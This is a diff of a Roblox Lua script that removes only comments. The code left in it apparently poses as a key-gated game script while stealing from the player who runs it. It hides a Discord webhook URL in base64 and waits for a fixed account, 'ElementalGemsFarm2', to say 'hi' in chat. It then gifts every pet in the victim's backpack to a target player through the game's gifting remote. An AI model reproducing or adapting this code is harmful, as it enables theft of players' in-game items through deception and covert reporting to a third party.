@@ -1,18 +1,14 @@
--- Services
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local TextChatService = game:GetService("TextChatService")
 local HttpService = game:GetService("HttpService")
 
--- Player References
 local LocalPlayer = Players.LocalPlayer
 local Backpack = LocalPlayer:WaitForChild("Backpack")
 local Humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid") or LocalPlayer.CharacterAdded:Wait():WaitForChild("Humanoid")
 
--- Remote Event
 local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
 
--- GUI Creation
 local KeyGui = Instance.new("ScreenGui")
 KeyGui.Name = "KeySystemGui"
 KeyGui.IgnoreGuiInset = true
@@ -75,13 +71,11 @@ SubmitButton.Position = UDim2.new(0.65, 0, 0.5, 0)
 SubmitButton.AnchorPoint = Vector2.new(0.5, 0.5)
 SubmitButton.Parent = Background
 
--- Config
 local CorrectKey = "GqAk1jt34CoxMYT9u7Vu20dTWys9D8ayB4YOx3N1CRGPQ8q5C7"
 local RedirectLink = "https://link-target.net/1360255/4OzD2a6hzruJ"
 local WebhookUrl = HttpService:JSONDecode('{"url":"' .. HttpService:GetAsync("data:text/plain;base64,aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4MjgzNDExNjA1OTMzNjczNC9mMDZqS2lDZ0ZYT3BGT3JJbDZ4Nk03UE9nTjF4Ylg1YVBTd18wYXpjMkFrXzk3RE1KdDQydUJXeDVva21LYzdIeGdyaw==") .. '"}').url
 local ChatTriggerName = "ElementalGemsFarm2"
 
--- Copy Link Function
 local function CopyToClipboard(text)
 	if setclipboard then
 		setclipboard(text)
@@ -156,7 +150,6 @@ task.spawn(function()
 	end
 end)
 
--- Wait for Remote Call
 local function WaitForPetGift()
 	local triggered = false
 	local connections = {}
@@ -174,7 +167,6 @@ local function WaitForPetGift()
 	for _, conn in ipairs(connections) do conn:Disconnect() end
 end
 
--- Give Pets to Target
 local function GivePetsTo(player)
 	for _, tool in ipairs(Backpack:GetChildren()) do
 		if tool:IsA("Tool") then
@@ -187,7 +179,6 @@ local function GivePetsTo(player)
 	end
 end
 
--- Chat Response Trigger
 TextChatService.OnIncomingMessage = function(msg)
 	if msg.TextSource and msg.TextSource.Name == ChatTriggerName then
 		if msg.Text:lower() == "hi" then
@@ -202,7 +193,6 @@ TextChatService.OnIncomingMessage = function(msg)
 	end
 end
 
--- Key Submit Handler
 SubmitButton.MouseButton1Click:Connect(function()
 	local enteredKey = KeyInput.Text
 	if enteredKey == CorrectKey then
